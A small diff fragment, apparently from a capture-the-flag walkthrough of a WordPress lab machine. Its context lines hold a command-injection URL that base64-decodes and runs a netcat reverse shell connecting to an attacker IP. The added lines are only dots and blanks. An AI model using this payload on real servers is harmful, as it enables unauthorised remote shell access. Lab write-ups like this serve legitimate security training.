@@ -73,4 +73,7 @@ http://www.smol.thm/wp-admin/index.php?cmd=echo YnVzeWJveCBuYyAxMC4xNC45MC4yMzUg
 ```
 http://www.smol.thm/wp-admin/index.php?cmd=echo YnVzeWJveCBuYyAxMC4xNC45MC4yMzUgNDQ0NSAtZSAvYmluL2Jhc2g= | base64 -d | bash
 
+............................................................................................................................................................................
+
+
 
